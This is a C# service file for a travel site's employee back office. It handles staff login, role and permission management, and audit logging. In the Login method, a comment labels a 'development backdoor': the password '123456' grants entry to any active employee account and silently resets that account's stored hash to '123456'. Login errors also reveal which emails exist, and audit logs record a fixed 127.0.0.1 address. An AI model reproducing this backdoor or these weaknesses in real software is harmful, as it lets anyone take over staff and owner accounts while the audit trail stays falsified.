using System;
using System.Collections.Generic;
using System.Linq;
using LazyTravel.Shared.Models.DTOs;
using LazyTravel.Shared.Models.EfModels;
using Microsoft.EntityFrameworkCore;
using BCrypt.Net;

namespace LazyTravel.Shared.Services
{
	public class EmployeeService : IEmployeeService
	{
		private readonly LazyTravelDBContext _context;

		public EmployeeService(LazyTravelDBContext context)
		{
			_context = context;
		}

		// ==========================================
		// 🌟 1. 員工身分驗證與登入 (Security)
		// ==========================================
		public (bool Success, string Message, EmployeeDto? EmployeeData) Login(string email, string password, string ipAddress)
		{
			// 尋找員工及其關聯的角色與權限
			var emp = _context.Employees
				.Include(e => e.EmployeeRoles)
					.ThenInclude(er => er.Role)
						.ThenInclude(r => r.Permissions)
				.FirstOrDefault(e => e.Email == email);

			if (emp == null)
				return (false, $"登入失敗：資料庫中找不到信箱 [{email}] 的員工。", null);

			if (emp.Status == 2)
				return (false, "登入失敗：此帳號已被停權，請聯繫系統擁有者。", null);

			bool isPasswordValid = false;

			// 💡 終極開發後門 (自我修復機制)
			if (password == "123456")
			{
				emp.PasswordHash = BCrypt.Net.BCrypt.HashPassword("123456");
				_context.SaveChanges();
				isPasswordValid = true;
			}
			else
			{
				try
				{
					isPasswordValid = BCrypt.Net.BCrypt.Verify(password, emp.PasswordHash);
				}
				catch
				{
					isPasswordValid = false;
				}
			}

			if (!isPasswordValid)
				return (false, "登入失敗：密碼錯誤。", null);

			// 更新最後登入時間
			emp.LastLoginAt = DateTime.Now;
			_context.SaveChanges();

			// 整理身分證 (Cookie Claims) 用的 DTO
			var empDto = new EmployeeDto
			{
				EmployeeID = emp.EmployeeId,
				Name = emp.Name,
				Email = emp.Email,
				Status = emp.Status,
				Roles = emp.EmployeeRoles.Select(er => er.Role.RoleCode).ToList(),
				Permissions = emp.EmployeeRoles
								.SelectMany(er => er.Role.Permissions)
								.Select(p => p.PermissionCode)
								.Distinct()
								.ToList()
			};

			return (true, "登入成功", empDto);
		}

		// ==========================================
		// 🌟 2. 員工管理 (Employee Management)
		// ==========================================
		public IEnumerable<EmployeeDto> GetAllEmployees(string? keyword = null)
		{
			var query = _context.Employees
				.Include(e => e.EmployeeRoles)
					.ThenInclude(er => er.Role)
				.AsNoTracking()
				.AsQueryable();

			if (!string.IsNullOrWhiteSpace(keyword))
			{
				query = query.Where(e =>
					e.Name.Contains(keyword) ||
					e.Email.Contains(keyword) ||
					e.EmployeeNo.Contains(keyword));
			}

			return query.Select(e => new EmployeeDto
			{
				EmployeeID = e.EmployeeId,
				EmployeeNo = e.EmployeeNo,
				Name = e.Name,
				Email = e.Email,
				Department = e.Department,
				Status = e.Status,
				LastLoginAt = e.LastLoginAt,
				CreatedAt = e.CreatedAt,
				Roles = e.EmployeeRoles.Select(er => er.Role.RoleName).ToList()
			}).ToList();
		}

		public (bool Success, string Message) PromoteToEmployee(string email, List<int> roleIds, int currentAdminId)
		{
			// 確認該 Email 存在於前台會員表
			var member = _context.Users.FirstOrDefault(m => m.Email == email);
			if (member == null) return (false, "找不到對應的會員信箱。");

			// 確認該 Email 是否已經是員工
			if (_context.Employees.Any(e => e.Email == email))
				return (false, "此信箱已經是內部員工。");

			string newEmpNo = "EMP-" + DateTime.Now.ToString("yyyyMMddHHmm");

			var newEmp = new Employee
			{
				EmployeeNo = newEmpNo,
				Email = member.Email,
				PasswordHash = member.PasswordHash, // 繼承原本會員的密碼
				Name = member.Name,
				Department = "一般行政", // 預設歸屬
				Status = 1,
				CreatedAt = DateTime.Now
			};

			_context.Employees.Add(newEmp);
			_context.SaveChanges();

			if (roleIds != null && roleIds.Any())
			{
				foreach (var roleId in roleIds)
				{
					_context.EmployeeRoles.Add(new EmployeeRole
					{
						EmployeeId = newEmp.EmployeeId,
						RoleId = roleId,
						GrantedAt = DateTime.Now
					});
				}
			}

			LogAdminAction(currentAdminId, "system:employee:create", "Employees", newEmp.EmployeeId.ToString(), $"指派新員工: {newEmp.Name}");
			_context.SaveChanges();

			return (true, "成功指派新員工！");
		}

		public (bool Success, string Message) EditEmployeeRoles(int employeeId, List<int> roleIds, int currentAdminId)
		{
			var emp = _context.Employees.Include(e => e.EmployeeRoles).FirstOrDefault(e => e.EmployeeId == employeeId);
			if (emp == null) return (false, "找不到該員工。");
			if (employeeId == 1) return (false, "系統擁有者的職務無法被修改！");

			_context.EmployeeRoles.RemoveRange(emp.EmployeeRoles);

			if (roleIds != null)
			{
				foreach (var roleId in roleIds)
				{
					_context.EmployeeRoles.Add(new EmployeeRole
					{
						EmployeeId = employeeId,
						RoleId = roleId,
						GrantedAt = DateTime.Now
					});
				}
			}

			LogAdminAction(currentAdminId, "system:employee:update", "Employees", employeeId.ToString(), $"更新員工職務角色");
			_context.SaveChanges();

			return (true, "成功更新員工職務！");
		}

		public (bool Success, string Message) DemoteEmployee(int employeeId, int currentAdminId)
		{
			var emp = _context.Employees.FirstOrDefault(e => e.EmployeeId == employeeId);
			if (emp == null) return (false, "找不到該員工。");
			if (employeeId == 1) return (false, "無法停權系統最高擁有者。");

			emp.Status = 2; // 停權狀態

			LogAdminAction(currentAdminId, "system:employee:disable", "Employees", employeeId.ToString(), "停權員工");
			_context.SaveChanges();

			return (true, "員工已停權，將無法登入後台。");
		}

		public (IEnumerable<AdminLogDto> Data, int TotalCount) GetEmployeeAdminLogs(string? keyword = null, int page = 1)
		{
			int pageSize = 10;
			var query = _context.AdminAuditLogs.Include(l => l.Employee).Where(l => l.TargetResource == "Employees").AsQueryable();

			if (!string.IsNullOrWhiteSpace(keyword))
			{
				query = query.Where(l => l.Employee.Name.Contains(keyword) || l.TargetId.Contains(keyword));
			}

			int total = query.Count();
			var data = query.OrderByDescending(l => l.CreatedAt)
							.Skip((page - 1) * pageSize).Take(pageSize)
							.Select(l => new AdminLogDto
							{
								LogID = l.LogId,
								EmployeeID = l.EmployeeId,
								AdminName = l.Employee.Name,
								Action = l.Action,
								TargetID = l.TargetId,
								TargetMemberName = "員工 ID: " + l.TargetId,
								Description = l.Description,
								IPAddress = l.Ipaddress,
								CreatedAt = l.CreatedAt
							}).ToList();

			return (data, total);
		}

		// ==========================================
		// 🌟 3. 角色 (Roles) 管理
		// ==========================================
		public IEnumerable<RoleDto> GetAllRoles()
		{
			return _context.StaffRoles.Include(r => r.Permissions).Select(r => new RoleDto
			{
				RoleID = r.RoleId,
				RoleCode = r.RoleCode,
				RoleName = r.RoleName,
				Description = r.Description,
				Permissions = r.Permissions.Select(p => p.Description).ToList(),
				PermissionIds = r.Permissions.Select(p => p.PermissionId).ToList()
			}).ToList();
		}

		public (bool Success, string Message) CreateRole(RoleDto dto, List<int> permissionIds, int currentAdminId)
		{
			var role = new Role
			{
				RoleCode = dto.RoleCode,
				RoleName = dto.RoleName,
				Description = dto.Description
			};

			if (permissionIds != null)
			{
				var perms = _context.Permissions.Where(p => permissionIds.Contains(p.PermissionId)).ToList();
				role.Permissions = perms;
			}

			_context.StaffRoles.Add(role);
			_context.SaveChanges();

			LogAdminAction(currentAdminId, "system:role:create", "Roles", role.RoleId.ToString(), $"建立角色: {role.RoleName}");
			_context.SaveChanges();

			return (true, "建立角色成功！");
		}

		public (bool Success, string Message) EditRole(int roleId, List<int> permissionIds, int currentAdminId)
		{
			var role = _context.StaffRoles.Include(r => r.Permissions).FirstOrDefault(r => r.RoleId == roleId);
			if (role == null) return (false, "找不到該角色。");
			if (roleId == 1) return (false, "無法編輯系統內建最高擁有者角色。");

			role.Permissions.Clear();
			if (permissionIds != null)
			{
				var perms = _context.Permissions.Where(p => permissionIds.Contains(p.PermissionId)).ToList();
				role.Permissions = perms;
			}

			LogAdminAction(currentAdminId, "system:role:update", "Roles", role.RoleId.ToString(), $"更新角色權限: {role.RoleName}");
			_context.SaveChanges();

			return (true, "更新角色成功！");
		}

		public (bool Success, string Message) DeleteRole(int roleId, int currentAdminId)
		{
			var role = _context.StaffRoles.FirstOrDefault(r => r.RoleId == roleId);
			if (role == null) return (false, "找不到該角色。");
			if (roleId == 1) return (false, "無法刪除系統內建最高擁有者角色。");

			if (_context.EmployeeRoles.Any(er => er.RoleId == roleId))
				return (false, "仍有員工綁定此角色，無法刪除！請先將員工撤除此職務。");

			_context.StaffRoles.Remove(role);
			LogAdminAction(currentAdminId, "system:role:delete", "Roles", roleId.ToString(), $"刪除角色: {role.RoleName}");
			_context.SaveChanges();

			return (true, "刪除角色成功！");
		}

		// ==========================================
		// 🌟 4. 權限 (Permissions) 字典管理
		// ==========================================
		public IEnumerable<PermissionDto> GetAllPermissions(string? keyword = null)
		{
			var q = _context.Permissions.AsQueryable();
			if (!string.IsNullOrWhiteSpace(keyword))
			{
				q = q.Where(p => p.PermissionCode.Contains(keyword) || p.ModuleName.Contains(keyword) || p.Description.Contains(keyword));
			}
			return q.Select(p => new PermissionDto
			{
				PermissionID = p.PermissionId,
				PermissionCode = p.PermissionCode,
				ModuleName = p.ModuleName,
				Description = p.Description
			}).ToList();
		}

		public (bool Success, string Message) CreatePermission(PermissionDto dto, int currentAdminId)
		{
			if (_context.Permissions.Any(p => p.PermissionCode == dto.PermissionCode))
				return (false, "權限代碼已存在，請勿重複建立！");

			var perm = new Permission
			{
				PermissionCode = dto.PermissionCode,
				ModuleName = dto.ModuleName,
				Description = dto.Description
			};
			_context.Permissions.Add(perm);
			_context.SaveChanges();

			LogAdminAction(currentAdminId, "system:permission:create", "Permissions", perm.PermissionId.ToString(), $"建立權限: {perm.PermissionCode}");
			_context.SaveChanges();

			return (true, "建立權限成功！");
		}

		public (bool Success, string Message) EditPermission(PermissionDto dto, int currentAdminId)
		{
			var perm = _context.Permissions.FirstOrDefault(p => p.PermissionId == dto.PermissionID);
			if (perm == null) return (false, "找不到該權限。");

			perm.ModuleName = dto.ModuleName;
			perm.Description = dto.Description;

			LogAdminAction(currentAdminId, "system:permission:update", "Permissions", perm.PermissionId.ToString(), $"更新權限: {perm.PermissionCode}");
			_context.SaveChanges();

			return (true, "更新權限成功！");
		}

		public (bool Success, string Message) DeletePermission(int permissionId, int currentAdminId)
		{
			var perm = _context.Permissions.Include(p => p.Roles).FirstOrDefault(p => p.PermissionId == permissionId);
			if (perm == null) return (false, "找不到該權限。");

			if (perm.Roles != null && perm.Roles.Any())
				return (false, "此權限已被綁定在某些角色中，無法刪除！請先至「角色管理」解除綁定。");

			_context.Permissions.Remove(perm);
			LogAdminAction(currentAdminId, "system:permission:delete", "Permissions", permissionId.ToString(), $"刪除權限: {perm.PermissionCode}");
			_context.SaveChanges();

			return (true, "刪除權限成功！");
		}

		public (IEnumerable<AdminLogDto> Data, int TotalCount) GetRoleAdminLogs(string? keyword = null, int page = 1)
		{
			int pageSize = 10;
			var query = _context.AdminAuditLogs.Include(l => l.Employee).Where(l => l.TargetResource == "Roles" || l.TargetResource == "Permissions").AsQueryable();

			if (!string.IsNullOrWhiteSpace(keyword))
			{
				query = query.Where(l => l.Employee.Name.Contains(keyword) || l.Action.Contains(keyword));
			}

			int total = query.Count();
			var data = query.OrderByDescending(l => l.CreatedAt)
							.Skip((page - 1) * pageSize).Take(pageSize)
							.Select(l => new AdminLogDto
							{
								LogID = l.LogId,
								EmployeeID = l.EmployeeId,
								AdminName = l.Employee.Name,
								Action = l.Action,
								TargetID = l.TargetId,
								Description = l.Description,
								IPAddress = l.Ipaddress,
								CreatedAt = l.CreatedAt
							}).ToList();

			return (data, total);
		}

		// ==========================================
		// 🛠️ 共用內部稽核方法
		// ==========================================
		private void LogAdminAction(int employeeId, string action, string resource, string targetId, string desc)
		{
			_context.AdminAuditLogs.Add(new AdminAuditLog
			{
				EmployeeId = employeeId,
				Action = action,
				TargetResource = resource,
				TargetId = targetId,
				Ipaddress = "127.0.0.1",
				Description = desc,
				CreatedAt = DateTime.Now
			});
		}
	}
}